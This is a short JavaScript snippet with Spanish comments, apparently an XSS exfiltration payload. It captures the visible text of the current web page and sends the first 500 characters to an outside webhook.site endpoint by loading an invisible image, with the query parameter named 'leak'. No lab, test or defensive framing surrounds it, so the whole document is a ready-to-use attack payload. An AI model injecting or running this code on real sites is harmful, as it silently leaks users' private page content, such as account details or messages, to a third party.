(function(){
  const contenido = document.body.innerText || document.documentElement.innerText;

  // Confirmación en consola
  console.log("Contenido capturado desde el DOM:", contenido.slice(0, 300));

  // Enviar extracto del DOM (solo los primeros 500 caracteres)
  const img = new Image();
  img.src = "	https://webhook.site/c7ff61f0-954a-4234-b0a0-cadfdd980c32?leak=" + encodeURIComponent(contenido.slice(0, 500));
})();
